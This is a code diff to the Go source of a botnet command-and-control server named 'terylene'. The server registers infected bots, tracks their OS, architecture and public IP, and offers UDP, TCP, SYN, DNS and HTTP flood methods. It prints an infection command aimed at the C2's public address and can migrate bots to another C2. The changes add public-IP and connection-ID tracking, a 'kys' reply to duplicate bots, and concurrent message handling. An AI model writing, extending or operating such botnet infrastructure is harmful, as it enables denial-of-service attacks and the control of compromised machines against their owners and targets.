@@ -23,12 +23,14 @@ type Botstruc struct {
 	arch    string
 	OS      string
 	localip string
+	pubip   string
+	connID  string
 }
 
 var (
 	//WARNING: changing these values will crash the C2 (unless you know what you're doing !)
 	methods     = []string{"UDP", "TCP", "SYN", "DNS", "HTTP", "UDP-VIP"}
-	registered  = make(map[string]string)
+	connIDs     = make(map[string]string)
 	tera        = make(map[string]Botstruc)
 	aliveclient = make(map[string]time.Time)
 )
@@ -40,8 +42,8 @@ func broadcaster(message, broadcastmsg string, socket *zmq.Socket) {
 
 func heartbeatsend(router *zmq.Socket) {
 	for {
-		for id, _ := range registered {
-			router.SendMessage(id, "heartbeat")
+		for id := range connIDs {
+			router.SendMessage(id, "h")
 		}
 
 		time.Sleep(2 * time.Second)
@@ -53,11 +55,21 @@ func heartbeatcheck() {
 			if time.Since(last) > 5*time.Second {
 				delete(aliveclient, id)
 				delete(tera, id)
-				fmt.Printf("\n\033[1;33mheartbeat monitor: %s has been pronounced dead\033[0m", id)
+				delete(connIDs, id)
+				fmt.Printf("\n\033[1;33mheartbeat monitor: terylene %s has been pronounced dead\033[0m", id)
 			}
 		}
 		time.Sleep(3 * time.Second)
 	}
+}
+
+func ExistsInMap(m map[string]string, targetValue string) bool {
+	for _, value := range m {
+		if value == targetValue {
+			return true
+		}
+	}
+	return false
 }
 
 func clearScreen() {
@@ -69,45 +81,51 @@ func clearScreen() {
 func routerhandle(router *zmq.Socket) {
 	for {
 		msg, err := router.RecvMessage(0)
-		if err != nil {
-			continue
-		}
-		if len(msg) == 0 || len(msg) == 1 {
-			return
-		}
 
-		//registration
-		if len(msg) == 5 {
-			if msg[1] == "reg" {
-				if _, exists := registered[msg[0]]; exists {
-					router.SendMessage(msg[0], "reg")
-				} else {
-					bot := Botstruc{
-						arch:    msg[2],
-						OS:      msg[3],
-						localip: msg[4],
+		go func(msg []string) {
+			if err != nil {
+				return
+			}
+			if len(msg) == 0 || len(msg) == 1 {
+				return
+			}
+
+			//registration
+			if len(msg) == 7 {
+				if msg[1] == "reg" {
+					if ExistsInMap(connIDs, msg[6]) {
+						router.SendMessage(msg[0], "kys")
+					} else {
+						bot := Botstruc{
+							arch:    msg[2],
+							OS:      msg[3],
+							localip: msg[4],
+							pubip:   msg[5],
+							connID:  msg[6],
+						}
+						tera[msg[0]] = bot
+						connIDs[msg[0]] = msg[6]
+						router.SendMessage(msg[0], "terylene", config.Broadcastport)
 					}
-					tera[msg[0]] = bot
-					registered[msg[0]] = "terylene"
-					router.SendMessage(msg[0], "terylene", config.Broadcastport)
 				}
 			}
-		}
 
-		if len(msg) == 2 {
 			if len(msg) == 2 {
-				if msg[1] == "heartbeat" {
-					aliveclient[msg[0]] = time.Now()
-				} else if msg[1] == "injustice" {
-					router.SendMessage(msg[0], "justice")
-				} else if msg[1] == "isdone" {
-					router.SendMessage(msg[0], "isserved")
+				if len(msg) == 2 {
+					if msg[1] == "h" {
+						aliveclient[msg[0]] = time.Now()
+					} else if msg[1] == "injustice" {
+						router.SendMessage(msg[0], "justice")
+					} else if msg[1] == "isdone" {
+						router.SendMessage(msg[0], "isserved")
+					}
 				}
 			}
-		}
 
+		}(msg)
 	}
 }
+
 func getpubIp() string {
 	url := "https://api.ipify.org?format=text"
 	resp, err := http.Get(url)
@@ -139,7 +157,9 @@ func main() {
 
 	scanner := bufio.NewScanner(os.Stdin)
 	publisher, err := zmq.NewSocket(zmq.PUB)
+
 	publisher.SetLinger(0)
+
 	defer publisher.Close()
 
 	if err != nil {
@@ -162,8 +182,6 @@ func main() {
 
 	router, err := zmq.NewSocket(zmq.ROUTER)
 
-	router.SetLinger(0)
-
 	if err != nil {
 		color.Red("[X] error creating router socket")
 	}
@@ -171,6 +189,7 @@ func main() {
 
 	err = router.Bind(fmt.Sprintf("tcp://%s:%s", config.C2ip, config.Routerport))
 
+	router.SetLinger(0)
 	if err != nil {
 		fmt.Println(err)
 		color.Red("[X] error binding port %s", config.Routerport)
@@ -188,7 +207,6 @@ func main() {
 	scanner.Scan()
 
 	clearScreen()
-
 	fmt.Println(poly.Welcome)
 	go routerhandle(router)
 	for {
@@ -220,11 +238,11 @@ func main() {
 			fmt.Println(methods_list)
 		case "list":
 			fmt.Println("Number of bots:", len(aliveclient))
-			for name, bot := range tera {
-				fmt.Printf("Bot ID: %s \narch: %s\nOS: %s\nlocalip: %s\n", name, bot.arch, bot.OS, bot.localip)
+			for _, bot := range tera {
+				fmt.Printf("Bot ID: %s \narch: %s\nOS: %s\npublic ip: %s\n", bot.connID, bot.arch, bot.OS, bot.pubip)
 			}
 		case "payload":
-			fmt.Println("linux payload:")
+			fmt.Println("terylene payload:")
 			if config.C2ip == "0.0.0.0" {
 				newC2ip := getpubIp()
 				fmt.Println(fmt.Sprintf(config.Infcommand, newC2ip))
@@ -244,7 +262,7 @@ func main() {
 			scanner.Scan()
 			rport := strings.TrimSpace(scanner.Text())
 
-			fmt.Printf("amount of botnets to transfer:")
+			fmt.Printf("amount of terylene to transfer:")
 			scanner.Scan()
 			amount := strings.TrimSpace(scanner.Text())
 
@@ -263,7 +281,7 @@ func main() {
 			} else {
 				fmt.Printf("server check passed, initiating transfer of %d botnets\n", intamount)
 				count := 0
-				for id, _ := range aliveclient {
+				for id := range aliveclient {
 					router.SendMessage(id, "migrate", target, rport)
 					delete(aliveclient, id)
 					delete(tera, id)
